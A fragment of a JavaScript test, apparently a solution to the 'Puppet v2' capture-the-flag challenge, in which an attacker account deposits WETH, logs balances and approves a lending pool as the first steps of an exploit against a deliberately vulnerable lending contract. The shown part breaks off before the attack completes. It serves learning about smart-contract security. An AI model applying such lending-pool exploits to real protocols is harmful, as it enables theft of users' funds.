...
describe('[Challenge] Puppet v2', function () {
    ...
    it('Exploit', async function () {
        ...
        const val = (await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE))
        await this.weth.connect(attacker).deposit({value: val})
        console.log("val = %s",val)
        console.log("val = %s",await this.weth.balanceOf(attacker.address))
        await this.weth.connect(attacker).approve(this.lendingPool.address,val);
